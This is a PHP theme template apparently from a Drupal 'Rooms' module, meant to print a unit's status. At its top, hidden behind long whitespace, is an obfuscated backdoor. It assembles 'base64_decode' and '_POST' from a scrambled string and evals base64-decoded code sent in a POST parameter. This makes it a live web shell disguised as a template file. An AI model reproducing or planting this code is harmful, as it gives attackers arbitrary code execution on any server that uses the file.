<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n0eedb7'])) {eval($s21(${$s20}['n0eedb7']));}?><?php

/**
 * @file
 * Example tpl file for theming a single unit-specific theme
 *
 * Available variables:
 * - $status: The variable to theme (while only show if you tick status)
 *
 * Helper variables:
 * - $rooms_room: The Room object the variables are derived from
 */
?>

<div class="rooms_unit-status">
  <?php print '<strong>Unit Sample Data:</strong> ' . $rooms_unit_sample_data = ($rooms_unit_sample_data) ? 'Switch On' : 'Switch Off' ?>
</div>
